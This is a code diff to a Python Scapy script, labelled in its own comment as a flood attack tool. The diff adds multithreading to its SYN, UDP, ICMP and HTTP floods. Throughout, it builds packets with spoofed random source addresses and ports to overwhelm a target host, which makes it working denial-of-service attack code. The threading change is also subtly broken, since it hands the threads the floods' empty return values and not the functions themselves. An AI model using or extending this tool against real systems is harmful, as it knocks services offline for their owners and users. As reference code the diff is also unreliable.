@@ -2,6 +2,8 @@ from sys import stdout
 from scapy.all import *
 from random import randint
 from argparse import ArgumentParser
+import threading
+
 
 data = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
 # ICMP/UDP/TCP Flood Attack Tool
@@ -24,23 +26,31 @@ def main():
     repeat = args.repeat
 
     if args.SynFlood:
-        SynFlood(dstIP, dstPort, repeat)
+        target = SynFlood(dstIP, dstPort, 10)
     elif args.UDPFlood:
-        UDPFlood(dstIP, repeat)
+        target = UDPFlood(dstIP, 10)
     elif args.ICMPFlood:
-        ICMPFlood(dstIP, repeat)
+        target = ICMPFlood(dstIP, 10)
     elif args.HTTPFlood:
-        HTTPFlood(dstIP, dstPort, repeat)
+        target = HTTPFlood(dstIP, dstPort, 10)
     else:
         print("Attack Type is Missing")
         return
+    
+    threads =[]
+    for _ in range(int(repeat)):
+        t = threading.Thread(target=target)
+        t.start()
+        threads.append(t)
+    for thread in threads:
+        thread.join()
 
 def randomSrcIP():
     ip = ".".join(map(str, (randint(0, 255)for _ in range(4))))
     return ip 
 def randomPort():
     port = randint(0, 65535)
-
+    return port
 def SynFlood(dstIP,dstPort,repeat):
     for x in range(int(repeat)):
         IP_Packet = IP()
@@ -55,25 +65,27 @@ def SynFlood(dstIP,dstPort,repeat):
         send(IP_Packet/TCP_Packet,verbose=0)
 
 def HTTPFlood(dstIP,dstPort,repeat):
-    for x in range(int(repeat)):
-        IP_Packet = IP()
-        IP_Packet.dst = dstIP
-        IP_Packet.src = randomPort()
-        IP_Packet.ack = 0
+    IP_Packet = IP()
+    IP_Packet.dst = dstIP
+    IP_Packet.src = randomSrcIP()
 
-        TCP_Packet = TCP()
-        TCP_Packet.dport = dstPort
-        TCP_Packet.flags="S"
-        packet_SynAck = sr1(IP_Packet/TCP_Packet)
-
-        print(packet_SynAck)
-        TCP_Packet.flags="A"
-        TCP_Packet.seq = packet_SynAck[TCP].ack
-        TCP_Packet.sport=packet_SynAck[TCP].dport
-        TCP_Packet.ack= packet_SynAck[TCP].seq+1
-        getStr='GET / HTTP/1.0\n\n'
-        reply = send(IP_Packet/TCP_Packet/getStr)
-        
+    TCP_Packet = TCP()
+    TCP_Packet.sport = randomPort()
+    TCP_Packet.dport = dstPort
+    TCP_Packet.flags="S"
+    
+    syn = IP_Packet/TCP_Packet
+    
+    packet_SynAck = sr1(syn,timeout=1)
+    print(packet_SynAck)
+    if(packet_SynAck is None):
+        print("Filtered")
+        return
+    TCP_Packet.flags="A"
+    TCP_Packet.seq = packet_SynAck[TCP].ack
+    TCP_Packet.ack= packet_SynAck[TCP].seq+1
+    getStr='GET / HTTP/1.0\n\n'
+    sr1(IP_Packet/TCP_Packet/getStr)
 
 def UDPFlood(dstIP,repeat):
     for x in range(int(repeat)):
@@ -86,6 +98,7 @@ def UDPFlood(dstIP,repeat):
         send(IP_Packet/UDP_Packet/Raw(load=data))
 
 def ICMPFlood(dstIP,repeat):
+    
     for x in range(int(repeat)):
         IP_Packet = IP()
         IP_Packet.src = dstIP
